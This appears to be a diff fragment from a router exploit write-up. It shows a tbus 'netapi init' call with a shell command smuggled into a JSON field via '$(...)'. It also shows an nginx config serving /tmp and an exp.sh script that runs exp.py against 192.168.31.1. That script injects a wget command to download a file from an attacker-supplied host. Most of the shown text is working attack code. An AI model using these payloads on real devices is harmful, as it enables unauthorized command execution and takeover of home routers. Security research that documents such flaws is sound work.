@@ -3,6 +3,18 @@
 ```python
 tbus call netapi init {"data":"$(echo 1>/tmp/kirin)"}
 
+magic.conf:
+events {
+	use epoll;
+	worker_connections  256;
+}
+http {
+	server {
+		listen 80;
+		root /tmp;
+	}
+}
+
 exp.sh:
 #!/bin/sh
 python3 exp.py 192.168.31.1 "wget -O /tmp/index.html http://$1:8000/index.html" 1>/dev/null
